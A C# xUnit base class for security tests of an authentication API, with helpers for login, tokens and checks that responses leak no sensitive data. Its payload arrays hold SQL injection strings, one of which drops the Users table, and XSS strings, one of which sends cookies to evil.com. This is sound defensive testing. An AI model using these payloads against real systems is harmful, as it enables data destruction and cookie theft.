using Xunit;
using KaopizAuth.WebAPI.Middleware;

namespace KaopizAuth.SecurityTests.Infrastructure;

/// <summary>
/// Base class for security tests with common setup and utilities
/// </summary>
public abstract class SecurityTestBase : IClassFixture<SecurityTestWebApplicationFactory>
{
    protected readonly SecurityTestWebApplicationFactory Factory;
    protected readonly HttpClient Client;

    protected SecurityTestBase(SecurityTestWebApplicationFactory factory)
    {
        Factory = factory;

        // Clear rate limiting state for test isolation
        LoginRateLimitingMiddleware.ClearRateLimitState();

        // Seed test data before creating client
        Factory.SeedTestDataAsync().Wait();

        Client = factory.CreateClient();
    }

    /// <summary>
    /// Common test credentials for security testing
    /// </summary>
    protected static class TestCredentials
    {
        public const string ValidEmail = "securitytest@example.com";
        public const string ValidPassword = "SecurePassword123!";
        public const string LockedEmail = "locked@example.com";
        public const string InvalidEmail = "invalid@example.com";
        public const string WeakPassword = "123";
    }

    /// <summary>
    /// Common SQL injection payloads for testing
    /// </summary>
    protected static class SqlInjectionPayloads
    {
        public static readonly string[] CommonPayloads = {
            "' OR 1=1 --",
            "' OR '1'='1",
            "'; DROP TABLE Users; --",
            "' UNION SELECT * FROM Users --",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--"
        };
    }

    /// <summary>
    /// Common XSS payloads for testing
    /// </summary>
    protected static class XssPayloads
    {
        public static readonly string[] CommonPayloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<div onmouseover=\"alert('XSS')\">test</div>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>"
        };
    }

    /// <summary>
    /// Authenticate and get JWT token for testing
    /// </summary>
    protected async Task<string> GetAuthTokenAsync(string email = TestCredentials.ValidEmail, string password = TestCredentials.ValidPassword)
    {
        var loginRequest = new
        {
            Email = email,
            Password = password
        };

        var json = JsonSerializer.Serialize(loginRequest);
        var content = new StringContent(json, Encoding.UTF8, "application/json");

        var response = await Client.PostAsync("/api/auth/login", content);

        if (!response.IsSuccessStatusCode)
        {
            throw new InvalidOperationException($"Failed to authenticate: {response.StatusCode}");
        }

        var responseContent = await response.Content.ReadAsStringAsync();
        var loginResponse = JsonSerializer.Deserialize<JsonElement>(responseContent);

        return loginResponse.GetProperty("data").GetProperty("accessToken").GetString()!;
    }

    /// <summary>
    /// Create HTTP client with authentication header
    /// </summary>
    protected async Task<HttpClient> GetAuthenticatedClientAsync()
    {
        var token = await GetAuthTokenAsync();
        Client.DefaultRequestHeaders.Authorization =
            new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", token);
        return Client;
    }

    /// <summary>
    /// Execute request and capture any exceptions for security analysis
    /// </summary>
    protected async Task<(HttpResponseMessage Response, Exception? Exception)> SafeExecuteAsync(Func<Task<HttpResponseMessage>> request)
    {
        try
        {
            var response = await request();
            return (response, null);
        }
        catch (Exception ex)
        {
            return (null!, ex);
        }
    }

    /// <summary>
    /// Verify response doesn't contain sensitive information
    /// </summary>
    protected static void VerifyNoSensitiveDataExposed(string content)
    {
        var contentLower = content.ToLowerInvariant();

        // Check for sensitive patterns but avoid false positives from JSON structure
        var sensitivePatterns = new[]
        {
            "password",
            "secret",
            "key",
            "connectionstring",
            "database",
            "sql injection",
            "exception:",
            "stacktrace:",
            "error:"
        };

        foreach (var pattern in sensitivePatterns)
        {
            contentLower.Should().NotContain(pattern,
                $"Response should not expose sensitive information: {pattern}");
        }

        // Special check for error messages (but not JSON field names)
        if (contentLower.Contains("\"error\":") && !contentLower.Contains("\"errors\":null"))
        {
            Assert.Fail("Response should not expose error details in error field");
        }

        // Check for token exposure (but allow "accessToken" field name in successful login)
        if (contentLower.Contains("token") && !contentLower.Contains("accesstoken") && !contentLower.Contains("refreshtoken"))
        {
            Assert.Fail("Response should not expose sensitive token information");
        }
    }
}